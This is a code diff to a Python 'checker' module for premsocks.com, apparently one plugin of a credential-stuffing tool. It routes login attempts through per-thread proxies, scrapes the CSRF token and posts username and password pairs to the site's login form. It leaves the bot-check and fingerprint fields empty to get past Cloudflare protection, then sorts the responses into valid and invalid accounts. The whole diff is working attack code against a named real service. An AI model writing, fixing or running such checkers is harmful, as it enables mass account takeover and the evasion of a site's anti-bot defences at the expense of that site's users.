@@ -1,6 +1,6 @@
 """
 Checker for Premsocks (premsocks.com)
-Uses traditional form-based login with Cloudflare bypass.
+Uses traditional form-based login with CSRF token and Cloudflare bypass.
 """
 import re
 import threading
@@ -15,7 +15,7 @@ except ImportError:
 
 BASE_URL = "https://premsocks.com"
 LOGIN_URL = BASE_URL + "/login"
-TIMEOUT = 20
+TIMEOUT = 30
 
 def check(username: str, password: str) -> Tuple[bool, str]:
     proxy = getattr(threading.current_thread(), 'proxy', None)
@@ -45,78 +45,45 @@ def check(username: str, password: str) -> Tuple[bool, str]:
 
         html = resp.text
 
-        # Find the form action
-        form_action = LOGIN_URL
-        match = re.search(r'<form[^>]*action="([^"]+)"', html, re.I)
-        if match:
-            action = match.group(1)
-            if action.startswith("/"):
-                form_action = urljoin(BASE_URL, action)
-            elif action.startswith("http"):
-                form_action = action
+        # Extract the CSRF token from the hidden input with name "_token"
+        token_match = re.search(r'<input[^>]*name="_token"[^>]*value="([^"]+)"', html, re.I)
+        csrf_token = token_match.group(1) if token_match else ""
 
-        # Extract hidden inputs
-        payload = {}
-        hidden_pattern = r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"'
-        for name, value in re.findall(hidden_pattern, html, re.I):
-            payload[name] = value
+        # Build payload
+        payload = {
+            "username": username,
+            "password": password,
+            "_token": csrf_token,
+            "ctoken": "",    # left empty; may be set by turnstile, but we'll try without
+            "fp_dd": "",
+            "fp_dd_json": "",
+            "fp": "",
+        }
 
-        # Also extract CSRF token from meta or script
-        token_match = re.search(r'<meta[^>]*name="csrf-token"[^>]*content="([^"]+)"', html, re.I)
-        if token_match:
-            payload["_token"] = token_match.group(1)
-        else:
-            # Try common CSRF field names
-            for name in ["csrf_token", "authenticity_token", "csrf"]:
-                if name in payload:
-                    break
+        # Step 2: POST credentials (the form action is the same URL)
+        post_resp = session.post(LOGIN_URL, data=payload, allow_redirects=True, timeout=TIMEOUT)
 
-        # Determine field names for username and password
-        username_field = None
-        password_field = None
-        input_pattern = r'<input[^>]*name="([^"]+)"[^>]*type="([^"]+)"'
-        for name, typ in re.findall(input_pattern, html, re.I):
-            if typ in ["text", "email"] and ("user" in name.lower() or "email" in name.lower()):
-                username_field = name
-            elif typ == "password" and "password" in name.lower():
-                password_field = name
-
-        if not username_field:
-            username_field = "username"
-        if not password_field:
-            password_field = "password"
-
-        payload[username_field] = username
-        payload[password_field] = password
-
-        # Step 2: POST credentials
-        post_resp = session.post(form_action, data=payload, allow_redirects=True, timeout=TIMEOUT)
-
-        # Step 3: Determine success
+        # Step 3: Check for success indicators in the final page
+        final_html = post_resp.text.lower()
         final_url = post_resp.url.lower()
-        html = post_resp.text.lower()
 
-        # Success: redirected to dashboard or non-login page
-        if "login" not in final_url and "register" not in final_url:
-            return True, "Login successful (redirected to dashboard)"
-
-        # Check for error messages in the page
-        if "invalid" in html or "incorrect" in html or "wrong" in html:
-            return False, "Invalid credentials"
-
-        # If we are still on the login page with no error, check for logout link
-        if "logout" in html:
+        # Success: presence of logout link or user panel
+        if "logout" in final_html or 'id="user"' in final_html:
             return True, "Login successful"
 
-        # If the page contains the login form again, it's a failure
-        if 'name="username"' in html or 'name="password"' in html:
+        # If we're redirected to the socks list page, also success
+        if "socks-proxy" in final_url:
+            return True, "Login successful (redirected to socks list)"
+
+        # Check for error messages
+        if "invalid" in final_html or "incorrect" in final_html:
+            return False, "Invalid credentials"
+
+        # If we are still on the login page with the login form
+        if 'name="username"' in final_html and 'name="password"' in final_html:
             return False, "Login failed – still on login page"
 
-        # If we're on a page that says "Login" but has no form, maybe success
-        if "login" in final_url and "register" not in final_url:
-            if len(post_resp.text) > 5000:  # dashboard pages tend to be larger
-                return True, "Login successful (dashboard content detected)"
-
+        # Fallback: if we don't see the login form but also no logout, treat as unknown
         return False, "Login failed – unknown response"
 
     except Exception as e:
